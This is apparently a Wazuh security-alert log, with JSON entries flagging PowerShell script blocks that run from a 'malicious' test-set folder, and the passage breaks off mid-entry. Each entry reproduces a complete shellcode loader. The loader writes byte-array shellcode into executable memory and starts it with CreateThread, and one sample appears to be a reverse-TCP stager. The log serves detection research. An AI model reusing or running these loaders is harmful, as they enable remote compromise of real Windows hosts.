{"timestamp":"2026-07-14T07:53:39.855+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":31,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1784015619.532662","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-14T07:54:10.1593738Z","eventRecordID":"200882","processID":"8272","threadID":"11488","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$H9S = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $H9S -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x46,0x0f,0x64,0xcf,0xdb,0xcf,0xd9,0x74,0x24,0xf4,0x5d,0x29,0xc9,0xb1,0x47,0x31,0x45,0x13,0x83,0xed,0xfc,0x03,0x45,0x49,0xed,0x91,0x33,0xbd,0x73,0x59,0xcc,0x3d,0x14,0xd3,0x29,0x0c,0x14,0x87,0x3a,0x3e,0xa4,0xc3,0x6f,0xb2,0x4f,0x81,0x9b,0x41,0x3d,0x0e,0xab,0xe2,0x88,0x68,0x82,0xf3,0xa1,0x49,0x85,0x77,0xb8,0x9d,0x65,0x46,0x73,0xd0,0x64,0x8f,0x6e,0x19,0x34,0x58,0xe4,0x8c,0xa9,0xed,0xb0,0x0c,0x41,0xbd,0x55,0x15,0xb6,0x75,0x57,0x34,0x69,0x0e,0x0e,0x96,0x8b,0xc3,0x3a,0x9f,0x93,0x00,0x06,0x69,0x2f,0xf2,0xfc,0x68,0xf9,0xcb,0xfd,0xc7,0xc4,0xe4,0x0f,0x19,0x00,0xc2,0xef,0x6c,0x78,0x31,0x8d,0x76,0xbf,0x48,0x49,0xf2,0x24,0xea,0x1a,0xa4,0x80,0x0b,0xce,0x33,0x42,0x07,0xbb,0x30,0x0c,0x0b,0x3a,0x94,0x26,0x37,0xb7,0x1b,0xe9,0xbe,0x83,0x3f,0x2d,0x9b,0x50,0x21,0x74,0x41,0x36,0x5e,0x66,0x2a,0xe7,0xfa,0xec,0xc6,0xfc,0x76,0xaf,0x8e,0x31,0xbb,0x50,0x4e,0x5e,0xcc,0x23,0x7c,0xc1,0x66,0xac,0xcc,0x8a,0xa0,0x2b,0x33,0xa1,0x15,0xa3,0xca,0x4a,0x66,0xed,0x08,0x1e,0x36,0x85,0xb9,0x1f,0xdd,0x55,0x46,0xca,0x48,0x53,0xd0,0x35,0x7d,0xe4,0x48,0xde,0x7c,0x1b,0x89,0xa5,0x08,0xfd,0xd9,0x89,0x5a,0x52,0x99,0x79,0x1b,0x02,0x71,0x90,0x94,0x7d,0x61,0x9b,0x7e,0x16,0x0b,0x74,0xd7,0x4e,0xa3,0xed,0x72,0x04,0x52,0xf1,0xa8,0x60,0x54,0x79,0x5f,0x94,0x1a,0x8a,0x2a,0x86,0xca,0x7a,0x61,0xf4,0x5c,0x84,0x5f,0x93,0x60,0x10,0x64,0x32,0x37,0x8c,0x66,0x63,0x7f,0x13,0x98,0x46,0xf4,0x9a,0x0c,0x29,0x62,0xe3,0xc0,0xa9,0x72,0xb5,0x8a,0xa9,0x1a,0x61,0xef,0xf9,0x3f,0x6e,0x3a,0x6e,0xec,0xfb,0xc5,0xc7,0x41,0xab,0xad,0xe5,0xbc,0x9b,0x71,0x15,0xeb,0x1d,0x4d,0xc0,0xd5,0x6b,0xbf,0xd0;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Nb7=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Nb7.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Nb7,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 92994fbe-bce3-4cc9-a652-76c3ac5ff283\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1468.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$H9S = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $H9S -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x46,0x0f,0x64,0xcf,0xdb,0xcf,0xd9,0x74,0x24,0xf4,0x5d,0x29,0xc9,0xb1,0x47,0x31,0x45,0x13,0x83,0xed,0xfc,0x03,0x45,0x49,0xed,0x91,0x33,0xbd,0x73,0x59,0xcc,0x3d,0x14,0xd3,0x29,0x0c,0x14,0x87,0x3a,0x3e,0xa4,0xc3,0x6f,0xb2,0x4f,0x81,0x9b,0x41,0x3d,0x0e,0xab,0xe2,0x88,0x68,0x82,0xf3,0xa1,0x49,0x85,0x77,0xb8,0x9d,0x65,0x46,0x73,0xd0,0x64,0x8f,0x6e,0x19,0x34,0x58,0xe4,0x8c,0xa9,0xed,0xb0,0x0c,0x41,0xbd,0x55,0x15,0xb6,0x75,0x57,0x34,0x69,0x0e,0x0e,0x96,0x8b,0xc3,0x3a,0x9f,0x93,0x00,0x06,0x69,0x2f,0xf2,0xfc,0x68,0xf9,0xcb,0xfd,0xc7,0xc4,0xe4,0x0f,0x19,0x00,0xc2,0xef,0x6c,0x78,0x31,0x8d,0x76,0xbf,0x48,0x49,0xf2,0x24,0xea,0x1a,0xa4,0x80,0x0b,0xce,0x33,0x42,0x07,0xbb,0x30,0x0c,0x0b,0x3a,0x94,0x26,0x37,0xb7,0x1b,0xe9,0xbe,0x83,0x3f,0x2d,0x9b,0x50,0x21,0x74,0x41,0x36,0x5e,0x66,0x2a,0xe7,0xfa,0xec,0xc6,0xfc,0x76,0xaf,0x8e,0x31,0xbb,0x50,0x4e,0x5e,0xcc,0x23,0x7c,0xc1,0x66,0xac,0xcc,0x8a,0xa0,0x2b,0x33,0xa1,0x15,0xa3,0xca,0x4a,0x66,0xed,0x08,0x1e,0x36,0x85,0xb9,0x1f,0xdd,0x55,0x46,0xca,0x48,0x53,0xd0,0x35,0x7d,0xe4,0x48,0xde,0x7c,0x1b,0x89,0xa5,0x08,0xfd,0xd9,0x89,0x5a,0x52,0x99,0x79,0x1b,0x02,0x71,0x90,0x94,0x7d,0x61,0x9b,0x7e,0x16,0x0b,0x74,0xd7,0x4e,0xa3,0xed,0x72,0x04,0x52,0xf1,0xa8,0x60,0x54,0x79,0x5f,0x94,0x1a,0x8a,0x2a,0x86,0xca,0x7a,0x61,0xf4,0x5c,0x84,0x5f,0x93,0x60,0x10,0x64,0x32,0x37,0x8c,0x66,0x63,0x7f,0x13,0x98,0x46,0xf4,0x9a,0x0c,0x29,0x62,0xe3,0xc0,0xa9,0x72,0xb5,0x8a,0xa9,0x1a,0x61,0xef,0xf9,0x3f,0x6e,0x3a,0x6e,0xec,0xfb,0xc5,0xc7,0x41,0xab,0xad,0xe5,0xbc,0x9b,0x71,0x15,0xeb,0x1d,0x4d,0xc0,0xd5,0x6b,0xbf,0xd0;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Nb7=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Nb7.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Nb7,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"92994fbe-bce3-4cc9-a652-76c3ac5ff283","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1468.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-14T07:53:44.850+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":32,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1784015624.544012","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-14T07:54:14.3953638Z","eventRecordID":"200898","processID":"60","threadID":"12108","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$K9ct = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $K9ct -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xbe,0x35,0x4a,0x6a,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$IxHy=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($IxHy.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$IxHy,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: baa4181e-dc98-4592-96ad-0c9df26cb70a\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1486.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$K9ct = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $K9ct -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xbe,0x35,0x4a,0x6a,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$IxHy=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($IxHy.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$IxHy,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"baa4181e-dc98-4592-96ad-0c9df26cb70a","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1486.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-14T07:53:44.860+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":33,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1784015624.555018","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-14T07:54:15.2473574Z","eventRecordID":"200902","processID":"9676","threadID":"5872","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xc7,0xba,0x68,0x04,0x80,0xa3,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x56,0x14,0x03,0x56,0x7c,0xe6,0x75,0x5f,0x94,0x64,0x75,0xa0,0x64,0x09,0xff,0x45,0x55,0x09,0x9b,0x0e,0xc5,0xb9,0xef,0x43,0xe9,0x32,0xbd,0x77,0x7a,0x36,0x6a,0x77,0xcb,0xfd,0x4c,0xb6,0xcc,0xae,0xad,0xd9,0x4e,0xad,0xe1,0x39,0x6f,0x7e,0xf4,0x38,0xa8,0x63,0xf5,0x69,0x61,0xef,0xa8,0x9d,0x06,0xa5,0x70,0x15,0x54,0x2b,0xf1,0xca,0x2c,0x4a,0xd0,0x5c,0x27,0x15,0xf2,0x5f,0xe4,0x2d,0xbb,0x47,0xe9,0x08,0x75,0xf3,0xd9,0xe7,0x84,0xd5,0x10,0x07,0x2a,0x18,0x9d,0xfa,0x32,0x5c,0x19,0xe5,0x40,0x94,0x5a,0x98,0x52,0x63,0x21,0x46,0xd6,0x70,0x81,0x0d,0x40,0x5d,0x30,0xc1,0x17,0x16,0x3e,0xae,0x5c,0x70,0x22,0x31,0xb0,0x0a,0x5e,0xba,0x37,0xdd,0xd7,0xf8,0x13,0xf9,0xbc,0x5b,0x3d,0x58,0x18,0x0d,0x42,0xba,0xc3,0xf2,0xe6,0xb0,0xe9,0xe7,0x9a,0x9a,0x65,0xcb,0x96,0x24,0x75,0x43,0xa0,0x57,0x47,0xcc,0x1a,0xf0,0xeb,0x85,0x84,0x07,0x0c,0xbc,0x71,0x97,0xf3,0x3f,0x82,0xb1,0x37,0x6b,0xd2,0xa9,0x9e,0x14,0xb9,0x29,0x1f,0xc1,0x54,0x2f,0xb7,0x2a,0x00,0x2e,0x23,0xc3,0x53,0x31,0x88,0xf4,0xdd,0xd7,0x9e,0xaa,0x8d,0x47,0x5e,0x1b,0x6e,0x38,0x36,0x71,0x61,0x67,0x26,0x7a,0xab,0x00,0xcc,0x95,0x02,0x78,0x78,0x0f,0x0f,0xf2,0x19,0xd0,0x85,0x7e,0x19,0x5a,0x2a,0x7e,0xd7,0xab,0x47,0x6c,0x8f,0x5b,0x12,0xce,0x19,0x63,0x88,0x65,0xa5,0xf1,0x37,0x2c,0xf2,0x6d,0x3a,0x09,0x34,0x32,0xc5,0x7c,0x4f,0xfb,0x53,0x3f,0x27,0x04,0xb4,0xbf,0xb7,0x52,0xde,0xbf,0xdf,0x02,0xba,0x93,0xfa,0x4c,0x17,0x80,0x57,0xd9,0x98,0xf1,0x04,0x4a,0xf1,0xff,0x73,0xbc,0x5e,0xff,0x56,0x3c,0xa2,0xd6,0x9e,0x4a,0xca,0xea;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 9b667d7c-42aa-4608-a491-290a0a0a14bd\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1493.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xc7,0xba,0x68,0x04,0x80,0xa3,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x56,0x14,0x03,0x56,0x7c,0xe6,0x75,0x5f,0x94,0x64,0x75,0xa0,0x64,0x09,0xff,0x45,0x55,0x09,0x9b,0x0e,0xc5,0xb9,0xef,0x43,0xe9,0x32,0xbd,0x77,0x7a,0x36,0x6a,0x77,0xcb,0xfd,0x4c,0xb6,0xcc,0xae,0xad,0xd9,0x4e,0xad,0xe1,0x39,0x6f,0x7e,0xf4,0x38,0xa8,0x63,0xf5,0x69,0x61,0xef,0xa8,0x9d,0x06,0xa5,0x70,0x15,0x54,0x2b,0xf1,0xca,0x2c,0x4a,0xd0,0x5c,0x27,0x15,0xf2,0x5f,0xe4,0x2d,0xbb,0x47,0xe9,0x08,0x75,0xf3,0xd9,0xe7,0x84,0xd5,0x10,0x07,0x2a,0x18,0x9d,0xfa,0x32,0x5c,0x19,0xe5,0x40,0x94,0x5a,0x98,0x52,0x63,0x21,0x46,0xd6,0x70,0x81,0x0d,0x40,0x5d,0x30,0xc1,0x17,0x16,0x3e,0xae,0x5c,0x70,0x22,0x31,0xb0,0x0a,0x5e,0xba,0x37,0xdd,0xd7,0xf8,0x13,0xf9,0xbc,0x5b,0x3d,0x58,0x18,0x0d,0x42,0xba,0xc3,0xf2,0xe6,0xb0,0xe9,0xe7,0x9a,0x9a,0x65,0xcb,0x96,0x24,0x75,0x43,0xa0,0x57,0x47,0xcc,0x1a,0xf0,0xeb,0x85,0x84,0x07,0x0c,0xbc,0x71,0x97,0xf3,0x3f,0x82,0xb1,0x37,0x6b,0xd2,0xa9,0x9e,0x14,0xb9,0x29,0x1f,0xc1,0x54,0x2f,0xb7,0x2a,0x00,0x2e,0x23,0xc3,0x53,0x31,0x88,0xf4,0xdd,0xd7,0x9e,0xaa,0x8d,0x47,0x5e,0x1b,0x6e,0x38,0x36,0x71,0x61,0x67,0x26,0x7a,0xab,0x00,0xcc,0x95,0x02,0x78,0x78,0x0f,0x0f,0xf2,0x19,0xd0,0x85,0x7e,0x19,0x5a,0x2a,0x7e,0xd7,0xab,0x47,0x6c,0x8f,0x5b,0x12,0xce,0x19,0x63,0x88,0x65,0xa5,0xf1,0x37,0x2c,0xf2,0x6d,0x3a,0x09,0x34,0x32,0xc5,0x7c,0x4f,0xfb,0x53,0x3f,0x27,0x04,0xb4,0xbf,0xb7,0x52,0xde,0xbf,0xdf,0x02,0xba,0x93,0xfa,0x4c,0x17,0x80,0x57,0xd9,0x98,0xf1,0x04,0x4a,0xf1,0xff,0x73,0xbc,0x5e,0xff,0x56,0x3c,0xa2,0xd6,0x9e,0x4a,0xca,0xea;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"9b667d7c-42aa-4608-a491-290a0a0a14bd","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1493.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-14T07:53:46.675+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":34,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1784015626.566326","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-14T07:54:16.1400254Z","eventRecordID":"200906","processID":"7052","threadID":"268","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$O2av = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $O2av -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdd,0xc5,0xd9,0x74,0x24,0xf4,0xbf,0xfb,0x2e,0xf0,0xb5,0x58,0x29,0xc9,0xb1,0x6e,0x83,0xe8,0xfc,0x31,0x78,0x16,0x03,0x78,0x16,0xe2,0x0e,0xd2,0x18,0x3c,0xf0,0x2b,0xd9,0x5f,0x79,0xce,0xe8,0x4d,0x1d,0x9a,0x59,0x42,0x56,0xce,0x51,0x29,0x3a,0xfb,0xe2,0x5f,0x92,0x0c,0x42,0xd5,0xc4,0x23,0x53,0xdb,0xc8,0xe8,0x97,0x7d,0xb4,0xf2,0xcb,0x5d,0x85,0x3c,0x1e,0x9f,0xc2,0x21,0xd1,0xcd,0x9b,0x2e,0x40,0xe2,0xa8,0x73,0x59,0x03,0x7e,0xf8,0xe1,0x7b,0xfb,0x3f,0x95,0x31,0x02,0x10,0x06,0x4d,0x4c,0x88,0x2c,0x09,0x6c,0xa9,0xe1,0x49,0x50,0xe0,0x8e,0xba,0x23,0xf3,0x46,0xf3,0xcc,0xc5,0xa6,0x58,0xf3,0xe9,0x2a,0xa0,0x34,0xcd,0xd4,0xd7,0x4e,0x2d,0x68,0xe0,0x95,0x4f,0xb6,0x65,0x0b,0xf7,0x3d,0xdd,0xef,0x09,0x91,0xb8,0x64,0x05,0x5e,0xce,0x22,0x0a,0x61,0x03,0x59,0x36,0xea,0xa2,0x8d,0xbe,0xa8,0x80,0x09,0x9a,0x6b,0xa8,0x08,0x46,0xdd,0xd5,0x4a,0x2e,0x82,0x73,0x01,0xdd,0xd7,0x02,0x48,0x8a,0x49,0x6e,0x06,0x4a,0xfe,0x07,0x8f,0x24,0x97,0x6e,0xa9,0xed,0x0f,0x3d,0x42,0x28,0xd7,0x42,0x79,0x05,0x28,0xeb,0xd6,0x31,0x81,0x42,0xb0,0x87,0x7b,0x12,0xe7,0x07,0x56,0x0f,0x84,0xac,0x68,0x19,0x1b,0x02,0xe1,0x9a,0xca,0xf5,0x9d,0x27,0xed,0xf5,0x5d,0x0b,0xbd,0x9d,0x0a,0x22,0xa2,0x98,0x4a,0xe1,0x37,0x6b,0xec,0x3b,0x15,0x26,0x66,0x3c,0xab,0x67,0xf2,0x6e,0x99,0x35,0xaa,0xdc,0x4d,0xd2,0xa7,0xb4,0x43,0x19,0xc7,0xe2,0x12,0x9b,0x5d,0x1d,0x7f,0x4c,0x22,0x2e,0x7f,0x8c,0xab,0xb1,0x15,0x88,0xfb,0x5b,0xf6,0xc6,0x93,0xee,0x4e